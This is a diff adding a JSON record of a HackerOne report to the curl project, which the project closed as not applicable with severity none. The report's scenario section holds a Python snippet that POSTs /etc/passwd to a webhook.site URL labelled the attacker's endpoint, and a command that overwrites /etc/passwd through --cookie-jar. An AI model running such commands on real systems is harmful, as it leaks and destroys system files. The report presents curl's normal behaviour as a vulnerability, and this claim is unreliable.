@@ -1,0 +1,132 @@
+{
+  "id": 3183957,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTgzOTU3",
+  "url": "https://hackerone.com/reports/3183957",
+  "title": "Arbitrary File Read via Unsanitized curl Usage Results in Sensitive File Exposure",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "severity_rating": "none",
+  "readable_substate": "N/A",
+  "created_at": "2025-06-09T12:16:05.954Z",
+  "submitted_at": "2025-06-09T12:16:06.193Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ednaq",
+    "url": "/ednaq",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/19c85a12ac35f466af1ea2b0ae853bfe5e8f057fb1d6fb62db131707bb67b30d"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-06-27T09:47:49.718Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2025-06-22T10:57:54.276Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello team,\nFirst of all, your open report policy has improved me a lot. Your very caring team has motivated me a lot. A real bug bounty program. I hope I can contribute something to you with this report.Thank you.\n\nThe application uses curl in a way that allows an attacker to specify arbitrary file paths as input for parameters like --cookie-jar or via POST data (-d @file). If untrusted user input is passed to these arguments, it’s possible to overwrite sensitive files or exfiltrate server files to an external attacker-controlled server. This can lead to sensitive data disclosure or denial of service.\n\n## Impact\n\nImpact\nSensitive file disclosure (exfiltration of /etc/passwd or other files).\n\nOverwriting critical files (e.g., authorized_keys, .env, configuration files).\n\nPotential supply chain compromise in automated build or CI environments.\n\nAttack Scenario\nExample 1: File Exfiltration with POST\n\nIf user input controls the file path (e.g. filename or data argument in a curl command):\n\n```\nimport subprocess\n\n# Attacker's endpoint\nwebhook_url = \"https://webhook.site/fd9dfaf1-7ed0-446e-9c6f-e182f6b11e4e\"\nfile_path = \"/etc/passwd\"\n\ncmd = [\n    \"curl\",\n    \"-X\", \"POST\",\n    \"-d\", f\"@{file_path}\",\n    webhook_url\n]\n\nsubprocess.run(cmd, check=True)\n\n```\nResult: The entire contents of /etc/passwd are POSTed to the attacker's server. This can be any sensitive file on the system.\n\nExample 2: Overwriting Files with --cookie-jar\n\nIf an attacker can control the filename passed to --cookie-jar:\n\n```\ncurl --cookie-jar /etc/passwd https://example.com\n\n```\nResult: The target file (/etc/passwd) is overwritten with a cookie file, destroying its original content. If this is a critical file, the application/system may become unusable.\n\nRecommendation :\nnever use unsanitized user input in system commands, especially file paths.\n\nSanitize and validate all file inputs.\n\nIf you must allow user-supplied files, use strict whitelisting and store files in isolated, non-sensitive directories.\n\nAvoid passing user input directly to curl command line without checks.",
+  "weakness": {
+    "id": 887,
+    "name": "External Control of File Name or Path"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 4430472,
+      "file_name": "Ekran_g_r_nt_s__2025-06-09_140421.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/98gk0afmtzo44zp5gmlmpmyyht9c?response-content-disposition=attachment%3B%20filename%3D%22Ekran_g_r_nt_s__2025-06-09_140421.png%22%3B%20filename%2A%3DUTF-8%27%27Ekran_g_r_nt_s__2025-06-09_140421.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXFIWBIHS%2F20250704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250704T194346Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIDEJIae%2B9%2FetCxnax38G0rRS1FvTS0xQQyEHW3aE8LsXAiBtjqFd34ZMQvfTQ9NgGvCQF0csdEJ2yfjm1pqqUL%2B%2BrCqyBQgzEAMaDDAxMzYxOTI3NDg0OSIMZsc9EKXfkV4upQwBKo8Fv8GLrALjw%2BqJvCLuhTAGEpr%2BYg5oiYjLlZtwyNv3PWCKGQMSWQSaem%2B1wxWGedHMldmDNxXei2HI3k5ARC2WPYcoqPM5UF6vrRPQxW1ujdTzy5XQs3cmH1thmEldH69zPvsR9UO6yN1sgX%2FEMNwLtKmIkh9lysTfPki9P2Foplvx334aeTsdTPITOOdQJliAPTkbUxfBT%2Bgkb%2B2C%2FbWA1HtjZmdig3l3RQRNDj9YRWElg%2FfIdnaoQ4A8ZPUQKxJVeiIsZzhlGFRHdRyyTtKHnUBP5Yp3h1iHEDzZFwa%2FIzHG1y96CcTNUTlCTcdueW%2FlbroYrGE2y0CALQaWyd0Ds45vIkfOma8AUZwnflFW%2FCIEcChUdUZnEEcvjiLaZJNCNZovwv3OmvCtleMd7nAIguSTmiO0hrfeboVTUUGyi5WId6RzBgXi%2BsI8cuf8aFzaNvQL9niDBgLJSRYSCzdg%2Fmt%2FbyZugzwMPivJE26cV3Adm3JJ2T1XxrTs5MkTYX6mOyopC086QxYITSx28Yfo5g68iPYxKYIouU86pC%2FzG4bBeNwwh7jpHLjlSX5fOVEaon%2FlA3OzE10RNaGAad7P%2B0hO7wqvl6IikWNFzCgVyOR84ZEkBONlWPC495LDnWVlyzbRJo8Z6NfWNtXzki8wf%2Fvj77A0keur%2FbJWu19uOixIdR6jGb%2Bmgs%2BN9eCHU%2FaxTLoMhSUuARUGsdSKjqOGOY5hFOOmrCUzKTP2QOu8knTy0lT5891q7tWzqPOEdiaTTGxCxWcwwW9dUKyvEEkaLG0lv3dWHYP1pVoCcYxBqpdJ2U4aVag355uhYENNdyFQ4NuB%2BGCHFNhgoVc%2Bx56CaQIdqP0Kk6kkD9nicgQYGjDxnqDDBjqyASGkDS%2FAot%2BTQxPiX%2BsnKaFg0KgJxJXMHSgkXRo9AWTGO35jOk0sCwomYh%2FzriRV7vfzWbGj0ABxBdHOyuHxOlkyWcDYlzbsP54hFJXFiTDMhRzyFkF7znmvEZuadhUP34VYQaRTQhf757x0TxmIEcTnVQGbn4wSKhcxf88ECGT1Bl%2FrWGjav6da0Dt75dfo%2B3X2dMZHpHvt5VLxCfqSeFjhWol%2BhmS%2Bs5A4nkHgKDb0Akg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1a3e02facbe3908b545d85af0efb791b684c69f03c9847fdadd4452025b601b9",
+      "file_size": 302346,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 4430474,
+      "file_name": "Ekran_g_r_nt_s__2025-06-09_141245.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/12bq338usvdpvvioiv0hyxptvmdc?response-content-disposition=attachment%3B%20filename%3D%22Ekran_g_r_nt_s__2025-06-09_141245.png%22%3B%20filename%2A%3DUTF-8%27%27Ekran_g_r_nt_s__2025-06-09_141245.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXFIWBIHS%2F20250704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250704T194346Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIDEJIae%2B9%2FetCxnax38G0rRS1FvTS0xQQyEHW3aE8LsXAiBtjqFd34ZMQvfTQ9NgGvCQF0csdEJ2yfjm1pqqUL%2B%2BrCqyBQgzEAMaDDAxMzYxOTI3NDg0OSIMZsc9EKXfkV4upQwBKo8Fv8GLrALjw%2BqJvCLuhTAGEpr%2BYg5oiYjLlZtwyNv3PWCKGQMSWQSaem%2B1wxWGedHMldmDNxXei2HI3k5ARC2WPYcoqPM5UF6vrRPQxW1ujdTzy5XQs3cmH1thmEldH69zPvsR9UO6yN1sgX%2FEMNwLtKmIkh9lysTfPki9P2Foplvx334aeTsdTPITOOdQJliAPTkbUxfBT%2Bgkb%2B2C%2FbWA1HtjZmdig3l3RQRNDj9YRWElg%2FfIdnaoQ4A8ZPUQKxJVeiIsZzhlGFRHdRyyTtKHnUBP5Yp3h1iHEDzZFwa%2FIzHG1y96CcTNUTlCTcdueW%2FlbroYrGE2y0CALQaWyd0Ds45vIkfOma8AUZwnflFW%2FCIEcChUdUZnEEcvjiLaZJNCNZovwv3OmvCtleMd7nAIguSTmiO0hrfeboVTUUGyi5WId6RzBgXi%2BsI8cuf8aFzaNvQL9niDBgLJSRYSCzdg%2Fmt%2FbyZugzwMPivJE26cV3Adm3JJ2T1XxrTs5MkTYX6mOyopC086QxYITSx28Yfo5g68iPYxKYIouU86pC%2FzG4bBeNwwh7jpHLjlSX5fOVEaon%2FlA3OzE10RNaGAad7P%2B0hO7wqvl6IikWNFzCgVyOR84ZEkBONlWPC495LDnWVlyzbRJo8Z6NfWNtXzki8wf%2Fvj77A0keur%2FbJWu19uOixIdR6jGb%2Bmgs%2BN9eCHU%2FaxTLoMhSUuARUGsdSKjqOGOY5hFOOmrCUzKTP2QOu8knTy0lT5891q7tWzqPOEdiaTTGxCxWcwwW9dUKyvEEkaLG0lv3dWHYP1pVoCcYxBqpdJ2U4aVag355uhYENNdyFQ4NuB%2BGCHFNhgoVc%2Bx56CaQIdqP0Kk6kkD9nicgQYGjDxnqDDBjqyASGkDS%2FAot%2BTQxPiX%2BsnKaFg0KgJxJXMHSgkXRo9AWTGO35jOk0sCwomYh%2FzriRV7vfzWbGj0ABxBdHOyuHxOlkyWcDYlzbsP54hFJXFiTDMhRzyFkF7znmvEZuadhUP34VYQaRTQhf757x0TxmIEcTnVQGbn4wSKhcxf88ECGT1Bl%2FrWGjav6da0Dt75dfo%2B3X2dMZHpHvt5VLxCfqSeFjhWol%2BhmS%2Bs5A4nkHgKDb0Akg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=111d01f4fb00257e149bb6e62055076523ec850b4afbb1fc8fd72e1efff4e615",
+      "file_size": 301159,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 7,
+  "voters": [
+    "2026",
+    "mohaned0101",
+    "turki-66",
+    "thalaivar304",
+    "athanas",
+    "tr1myb3st",
+    "209ben"
+  ],
+  "severity": {
+    "rating": "none",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
